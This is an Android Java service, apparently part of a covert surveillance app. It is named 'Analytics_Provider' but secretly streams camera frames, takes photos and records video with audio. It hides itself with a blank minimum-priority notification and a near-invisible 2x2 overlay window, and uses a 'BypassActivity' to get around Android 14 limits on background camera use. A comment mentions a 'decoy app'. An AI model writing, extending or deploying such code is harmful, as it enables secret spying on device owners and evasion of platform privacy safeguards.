package com.labs.labrats;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.util.Size;
import android.view.Gravity;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.camera.camera2.interop.Camera2Interop;
import androidx.camera.camera2.interop.Camera2CameraInfo;
import androidx.camera.core.Camera;
import androidx.camera.core.CameraInfo;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageAnalysis;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.ImageProxy;
import androidx.camera.core.Preview;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.camera.video.FileOutputOptions;
import androidx.camera.video.Quality;
import androidx.camera.video.QualitySelector;
import androidx.camera.video.Recorder;
import androidx.camera.video.Recording;
import androidx.camera.video.VideoCapture;
import androidx.camera.video.VideoRecordEvent;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import androidx.lifecycle.Lifecycle;
import androidx.lifecycle.LifecycleOwner;
import androidx.lifecycle.LifecycleRegistry;

import com.google.common.util.concurrent.ListenableFuture;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

@androidx.camera.camera2.interop.ExperimentalCamera2Interop
public class Analytics_Provider extends Service implements LifecycleOwner {
    private static final String TAG = "Analytics_Provider";
    private static final String CHANNEL_ID = "Analytics_ProviderChannel";
    private static final int NOTIFICATION_ID = 2002;

    private LifecycleRegistry lifecycleRegistry;
    private ProcessCameraProvider cameraProvider;
    private Preview preview;
    private ImageAnalysis imageAnalysis;
    private ImageCapture imageCapture;
    private VideoCapture<Recorder> videoCapture;
    private Recording currentRecording;
    private Camera camera;

    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private volatile boolean surfaceReady = false;
    private CountDownLatch surfaceLatch;

    private ExecutorService cameraExecutor;
    private static Analytics_Provider instance;

    // State trackers
    private static volatile boolean isStreaming = false;
    private static volatile boolean isRecording = false;
    private static volatile boolean captureInProgress = false;
    private static volatile String currentCameraId = "0";
    private static volatile int streamWidth = 640;
    private static volatile int streamHeight = 480;
    private static volatile int streamQuality = 50;
    private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(5);
    private static volatile byte[] lastCapturedPhoto = null;
    private static volatile String lastCaptureError = null;
    private static CountDownLatch captureLatch;
    private static String currentVideoPath = null;
    private static long recordingStartTime = 0;
    private static volatile boolean nightModeEnabled = false;

    public static Analytics_Provider getInstance() { return instance; }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        lifecycleRegistry = new LifecycleRegistry(this);
        lifecycleRegistry.setCurrentState(Lifecycle.State.CREATED);
        cameraExecutor = Executors.newSingleThreadExecutor();
        
        createNotificationChannel();
        ensureForeground();
        
        nightModeEnabled = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("night_mode", false);
        
        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);
        cameraProviderFuture.addListener(() -> {
            try {
                cameraProvider = cameraProviderFuture.get();
                lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
            } catch (Exception e) {
                Log.e(TAG, "CameraX Init Error: " + e.getMessage());
            }
        }, ContextCompat.getMainExecutor(this));
    }

    @NonNull
    @Override
    public Lifecycle getLifecycle() { return lifecycleRegistry; }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        ensureForeground();
        if (intent != null) {
            String action = intent.getAction();
            if (Constants.ACTION_START_STREAM.equals(action)) {
                startStreaming(intent.getStringExtra("cameraId"), 
                             intent.getIntExtra("width", 640), 
                             intent.getIntExtra("height", 480), 
                             intent.getIntExtra("quality", 50));
            } else if (Constants.ACTION_STOP_STREAM.equals(action)) {
                stopStreaming();
            } else if (Constants.ACTION_CAPTURE_PHOTO.equals(action)) {
                capturePhotoBackground(intent.getStringExtra("cameraId"));
            } else if (Constants.ACTION_START_RECORDING.equals(action)) {
                startVideoRecording(intent.getStringExtra("cameraId"), 
                                  intent.getIntExtra("width", 1280), 
                                  intent.getIntExtra("height", 720));
            } else if (Constants.ACTION_STOP_RECORDING.equals(action)) {
                stopVideoRecording();
            } else if (Constants.ACTION_STOP_OPTICS.equals(action) || "STOP".equals(action)) {
                shutdown();
            }
        }
        return START_STICKY;
    }

    private void ensureForeground() {
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(".")
                .setContentText(".")
                .setSmallIcon(R.drawable.ic_sprocket_gear)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
            if (isStreaming || isRecording || captureInProgress) {
                serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
            }
            if (isRecording) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
                }
            }
            startForeground(NOTIFICATION_ID, notification, serviceType);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    @androidx.camera.camera2.interop.ExperimentalCamera2Interop
    public void startStreaming(String cameraId, int width, int height, int quality) {
        if (cameraProvider == null) return;
        
        // [STABILITY_BYPASS] Required ONLY for Android 14+ background camera access
        // Starting this on older APIs (like API 24) causes the decoy app to pop up.
        if (Build.VERSION.SDK_INT >= 34) {
            try {
                Intent bypass = new Intent(this, CameraHelper.BypassActivity.class);
                bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                startActivity(bypass);
            } catch (Exception e) { Log.e(TAG, "Bypass fail: " + e.getMessage()); }
        }

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                // Hard kill previous session
                isStreaming = false;
                cameraProvider.unbindAll();
                frameQueue.clear();
                
                // Breath time for hardware HAL - NON-BLOCKING
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    currentCameraId = cameraId;
                    streamWidth = width;
                    streamHeight = height;
                    streamQuality = quality;
                    
                    boolean isExtraFront = false;
                    try {
                        CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
                        CameraCharacteristics cc = cm.getCameraCharacteristics(cameraId);
                        Integer facing = cc.get(CameraCharacteristics.LENS_FACING);
                        isExtraFront = (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT && !"1".equals(cameraId));
                    } catch (Exception ignored) {}

                    if (isExtraFront) {
                        // Different aspect ratio for extra front cameras (Wide 16:9 instead of standard)
                        streamHeight = (int)(streamWidth * 0.5625);
                    }

                    createOverlay();

                    ImageAnalysis.Builder analysisBuilder = new ImageAnalysis.Builder()
                            .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                            .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888);

                    if (isExtraFront) {
                        analysisBuilder.setTargetResolution(new Size(streamWidth, streamHeight));
                    }

                    if (nightModeEnabled) {
                        Camera2Interop.Extender<ImageAnalysis> extender = new Camera2Interop.Extender<>(analysisBuilder);
                        // HARD_MANUAL_EXPOSURE: Bypasses AE algorithms for true sensor sensitivity
                        extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE, android.hardware.camera2.CaptureRequest.CONTROL_AE_MODE_OFF);
                        extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.SENSOR_EXPOSURE_TIME, 100000000L); // 1/10s
                        extender.setCaptureRequestOption(android.hardware.camera2.CaptureRequest.SENSOR_SENSITIVITY, 2000); 
                    }

                    imageAnalysis = analysisBuilder.build();
                    imageAnalysis.setAnalyzer(cameraExecutor, image -> {
                        if (!isStreaming) { image.close(); return; }
                        try {
                            byte[] jpegData = yuv420ToJpeg(image, streamQuality);
                            if (jpegData != null) {
                                if (frameQueue.size() >= 5) frameQueue.poll();
                                frameQueue.offer(jpegData);
                            }
                        } finally {
                            image.close();
                        }
                    });

                    CameraSelector selector;
                    if ("1".equals(cameraId)) {
                        selector = CameraSelector.DEFAULT_FRONT_CAMERA;
                    } else if (cameraId != null && !cameraId.equals("0")) {
                        selector = new CameraSelector.Builder()
                                .addCameraFilter(cameraInfos -> {
                                    for (CameraInfo c : cameraInfos) {
                                        if (Camera2CameraInfo.from(c).getCameraId().equals(cameraId)) {
                                            return Collections.singletonList(c);
                                        }
                                    }
                                    return Collections.emptyList();
                                }).build();
                    } else {
                        selector = CameraSelector.DEFAULT_BACK_CAMERA;
                    }
                    
                    preview = new Preview.Builder().build();
                    preview.setSurfaceProvider(ContextCompat.getMainExecutor(this), request -> {
                        if (surfaceReady && surfaceView != null) {
                            Surface surface = surfaceView.getHolder().getSurface();
                            if (surface != null && surface.isValid()) {
                                request.provideSurface(surface, ContextCompat.getMainExecutor(this), result -> {});
                                return;
                            }
                        }
                        
                        // Hardware surface might not be ready yet on slower devices (API 24 fallback)
                        LabRatsWorker.execute(() -> {
                            try {
                                if (surfaceLatch != null) surfaceLatch.await(5, TimeUnit.SECONDS);
                            } catch (Exception ignored) {}
                            
                            new Handler(Looper.getMainLooper()).post(() -> {
                                if (surfaceView != null && surfaceView.getHolder().getSurface().isValid()) {
                                    request.provideSurface(surfaceView.getHolder().getSurface(), ContextCompat.getMainExecutor(this), result -> {});
                                } else {
                                    request.willNotProvideSurface();
                                }
                            });
                        });
                    });

                    try {
                        isStreaming = true;
                        ensureForeground();
                        camera = cameraProvider.bindToLifecycle(this, selector, preview, imageAnalysis);
                        lifecycleRegistry.setCurrentState(Lifecycle.State.STARTED);
                        FirebaseConfig.logActivity("OPTICS_INIT: CameraX stream re-established [" + (nightModeEnabled ? "NIGHT" : "STD") + "]");
                    } catch (Exception e) {
                        Log.e(TAG, "Binding Error: " + e.getMessage());
                        isStreaming = false;
                        ensureForeground();
                    }
                }, 400); // 400ms hardware breather

            } catch (Exception e) {
                Log.e(TAG, "Sync Error: " + e.getMessage());
            }
        });
    }

    private void createOverlay() {
        if (surfaceView != null) {
            return;
        }

        surfaceReady = false;
        surfaceLatch = new CountDownLatch(1);

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                if (surfaceView != null) return;
                
                windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                surfaceView = new SurfaceView(this);

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        2, 2,
                        (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : 2003, // 2003 = TYPE_SYSTEM_ALERT
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSLUCENT);
                params.gravity = Gravity.TOP | Gravity.START;
                params.alpha = 0.01f;

                surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
                    @Override
                    public void surfaceCreated(@NonNull SurfaceHolder holder) {
                        surfaceReady = true;
                        if (surfaceLatch != null) surfaceLatch.countDown();
                    }
                    @Override public void surfaceChanged(@NonNull SurfaceHolder holder, int f, int w, int h) {}
                    @Override public void surfaceDestroyed(@NonNull SurfaceHolder holder) { 
                        surfaceReady = false; 
                    }
                });

                windowManager.addView(surfaceView, params);
            } catch (Exception e) {
                Log.e(TAG, "Overlay Error: " + e.getMessage());
                if (surfaceLatch != null) surfaceLatch.countDown();
            }
        });
    }

    private void removeOverlay() {
        if (windowManager != null && surfaceView != null) {
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    windowManager.removeView(surfaceView);
                } catch (Exception ignored) {}
                surfaceView = null;
                windowManager = null;
                surfaceReady = false;
            });
        }
    }

    public void capturePhotoBackground(String cameraId) {
        if (cameraProvider == null || captureInProgress) return;
        captureInProgress = true;
        captureLatch = new CountDownLatch(1);
        lastCapturedPhoto = null;

        imageCapture = new ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build();

        CameraSelector selector;
        if ("1".equals(cameraId)) {
            selector = CameraSelector.DEFAULT_FRONT_CAMERA;
        } else if (cameraId != null && !cameraId.equals("0")) {
            selector = new CameraSelector.Builder()
                    .addCameraFilter(cameraInfos -> {
                        for (CameraInfo c : cameraInfos) {
                            if (Camera2CameraInfo.from(c).getCameraId().equals(cameraId)) {
                                return Collections.singletonList(c);
                            }
                        }
                        return Collections.emptyList();
                    }).build();
        } else {
            selector = CameraSelector.DEFAULT_BACK_CAMERA;
        }

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                cameraProvider.unbindAll();
                camera = cameraProvider.bindToLifecycle(this, selector, imageCapture);
                
                imageCapture.takePicture(cameraExecutor, new ImageCapture.OnImageCapturedCallback() {
                    @Override
                    public void onCaptureSuccess(@NonNull ImageProxy image) {
                        try {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] data = new byte[buffer.remaining()];
                            buffer.get(data);
                            lastCapturedPhoto = data;
                        } finally {
                            image.close();
                            captureInProgress = false;
                            captureLatch.countDown();
                            new Handler(Looper.getMainLooper()).post(() -> {
                                if (isStreaming) {
                                    startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
                                } else {
                                    if (cameraProvider != null) cameraProvider.unbindAll();
                                    ensureForeground();
                                }
                            });
                        }
                    }

                    @Override
                    public void onError(@NonNull ImageCaptureException exception) {
                        lastCaptureError = exception.getMessage();
                        captureInProgress = false;
                        captureLatch.countDown();
                        new Handler(Looper.getMainLooper()).post(() -> {
                            if (!isStreaming) {
                                if (cameraProvider != null) cameraProvider.unbindAll();
                                ensureForeground();
                            }
                        });
                    }
                });
            } catch (Exception e) {
                captureInProgress = false;
                captureLatch.countDown();
            }
        });
    }

    public void startVideoRecording(String cameraId, int width, int height) {
        if (cameraProvider == null || isRecording) return;

        Quality quality = Quality.HD; // Default 720p
        if (width >= 3840 || height >= 2160) quality = Quality.UHD;
        else if (width >= 1920 || height >= 1080) quality = Quality.FHD;
        else if (width <= 640) quality = Quality.SD;

        Recorder recorder = new Recorder.Builder()
                .setExecutor(cameraExecutor)
                .setQualitySelector(QualitySelector.from(quality))
                .build();
        videoCapture = VideoCapture.withOutput(recorder);

        CameraSelector selector;
        if ("1".equals(cameraId)) {
            selector = CameraSelector.DEFAULT_FRONT_CAMERA;
        } else if (cameraId != null && !cameraId.equals("0")) {
            selector = new CameraSelector.Builder()
                    .addCameraFilter(cameraInfos -> {
                        for (CameraInfo c : cameraInfos) {
                            if (Camera2CameraInfo.from(c).getCameraId().equals(cameraId)) {
                                return Collections.singletonList(c);
                            }
                        }
                        return Collections.emptyList();
                    }).build();
        } else {
            selector = CameraSelector.DEFAULT_BACK_CAMERA;
        }
        
        File videoDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "LabRATS-Security");
        if (!videoDir.exists()) videoDir.mkdirs();
        File videoFile = new File(videoDir, "VID_" + System.currentTimeMillis() + ".mp4");
        currentVideoPath = videoFile.getAbsolutePath();

        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                cameraProvider.unbindAll();
                camera = cameraProvider.bindToLifecycle(this, selector, videoCapture);
                
                FileOutputOptions options = new FileOutputOptions.Builder(videoFile).build();
                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return;
                
                currentRecording = videoCapture.getOutput().prepareRecording(this, options)
                        .withAudioEnabled()
                        .start(ContextCompat.getMainExecutor(this), event -> {
                            if (event instanceof VideoRecordEvent.Start) {
                                isRecording = true;
                                recordingStartTime = System.currentTimeMillis();
                                FirebaseConfig.logActivity("OPTICS_VIDEO: Recording started");
                            } else if (event instanceof VideoRecordEvent.Finalize) {
                                isRecording = false;
                                new Handler(Looper.getMainLooper()).post(() -> {
                                    if (!isStreaming) {
                                        if (cameraProvider != null) cameraProvider.unbindAll();
                                        ensureForeground();
                                    }
                                });
                            }
                        });
            } catch (Exception e) {
                Log.e(TAG, "Video Init Error: " + e.getMessage());
            }
        });
    }

    public void stopVideoRecording() {
        if (currentRecording != null) {
            currentRecording.stop();
            currentRecording = null;
            // State is reset in the VideoRecordEvent.Finalize listener
        }
    }

    private byte[] yuvToNv21(ImageProxy image) {
        int width = image.getWidth();
        int height = image.getHeight();
        byte[] nv21 = new byte[width * height * 3 / 2];
        
        ImageProxy.PlaneProxy yPlane = image.getPlanes()[0];
        ImageProxy.PlaneProxy uPlane = image.getPlanes()[1];
        ImageProxy.PlaneProxy vPlane = image.getPlanes()[2];

        ByteBuffer yBuffer = yPlane.getBuffer();
        ByteBuffer uBuffer = uPlane.getBuffer();
        ByteBuffer vBuffer = vPlane.getBuffer();

        int yRowStride = yPlane.getRowStride();
        int uRowStride = uPlane.getRowStride();
        int uvPixelStride = uPlane.getPixelStride();

        // Copy Y plane
        int pos = 0;
        for (int row = 0; row < height; row++) {
            yBuffer.position(row * yRowStride);
            yBuffer.get(nv21, pos, width);
            pos += width;
        }

        // Copy UV plane (interleaved)
        for (int row = 0; row < height / 2; row++) {
            for (int col = 0; col < width / 2; col++) {
                int uvOffset = row * uRowStride + col * uvPixelStride;
                if (uvOffset < vBuffer.capacity() && uvOffset < uBuffer.capacity()) {
                    nv21[pos++] = vBuffer.get(uvOffset);
                    nv21[pos++] = uBuffer.get(uvOffset);
                }
            }
        }
        return nv21;
    }

    private byte[] yuv420ToJpeg(ImageProxy image, int quality) {
        try {
            byte[] nv21 = yuvToNv21(image);
            YuvImage yuvImage = new YuvImage(nv21, android.graphics.ImageFormat.NV21, image.getWidth(), image.getHeight(), null);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            yuvImage.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), quality, out);
            byte[] imageBytes = out.toByteArray();

            // Handle rotation
            if (image.getImageInfo().getRotationDegrees() != 0) {
                Bitmap bitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.length);
                if (bitmap != null) {
                    Matrix matrix = new Matrix();
                    matrix.postRotate(image.getImageInfo().getRotationDegrees());
                    Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
                    ByteArrayOutputStream rotateOut = new ByteArrayOutputStream();
                    rotated.compress(Bitmap.CompressFormat.JPEG, quality, rotateOut);
                    imageBytes = rotateOut.toByteArray();
                    bitmap.recycle();
                    rotated.recycle();
                }
            }
            return imageBytes;
        } catch (Exception e) {
            return null;
        }
    }

    public void stopStreaming() {
        isStreaming = false;
        frameQueue.clear();
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                if (cameraProvider != null) {
                    cameraProvider.unbindAll();
                }
            } catch (Exception ignored) {}
            removeOverlay();
            ensureForeground(); // Force indicator reset
        });
    }

    private void shutdown() {
        isStreaming = false;
        isRecording = false;
        captureInProgress = false;
        
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                if (cameraProvider != null) {
                    cameraProvider.unbindAll();
                }
            } catch (Exception ignored) {}
            
            if (currentRecording != null) {
                currentRecording.stop();
                currentRecording = null;
            }
            
            removeOverlay();
            lifecycleRegistry.setCurrentState(Lifecycle.State.DESTROYED);
            stopForeground(true);
            stopSelf();
        });
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, ".", NotificationManager.IMPORTANCE_MIN);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    @Override public void onDestroy() { 
        lifecycleRegistry.setCurrentState(Lifecycle.State.DESTROYED);
        cameraExecutor.shutdown();
        instance = null;
        super.onDestroy(); 
    }

    // Static Accessors preserved for existing UI compatibility
    public static boolean isCurrentlyStreaming() { return isStreaming; }
    public static byte[] getNextFrame(long timeout) { try { return frameQueue.poll(timeout, TimeUnit.MILLISECONDS); } catch (Exception e) { return null; } }
    public static byte[] waitForPhoto(long timeout) { 
        if (captureLatch != null) try { captureLatch.await(timeout, TimeUnit.MILLISECONDS); } catch (Exception ignored) {}
        return lastCapturedPhoto; 
    }
    public static String getLastCaptureError() { return lastCaptureError; }
    public static boolean isCaptureInProgress() { return captureInProgress; }
    public static String getCurrentCameraId() { return currentCameraId; }
    public static int getStreamWidth() { return streamWidth; }
    public static int getStreamHeight() { return streamHeight; }
    public static boolean isCurrentlyRecording() { return isRecording; }
    public static String getCurrentVideoPath() { return currentVideoPath; }
    public static long getRecordingDuration() { return isRecording ? (System.currentTimeMillis() - recordingStartTime) / 1000 : 0; }
    public static boolean isNightModeEnabled(Context c) { return nightModeEnabled; }
    
    @androidx.camera.camera2.interop.ExperimentalCamera2Interop
    public void setNightMode(boolean e) { 
        nightModeEnabled = e; 
        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("night_mode", e).apply();
        if (isStreaming) {
            // Delay restart to allow full unbind
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                startStreaming(currentCameraId, streamWidth, streamHeight, streamQuality);
            }, 800);
        }
    }
    public void setFlashMode(boolean on) { if (camera != null) camera.getCameraControl().enableTorch(on); }

    @Nullable @Override public IBinder onBind(Intent intent) { return null; }
}
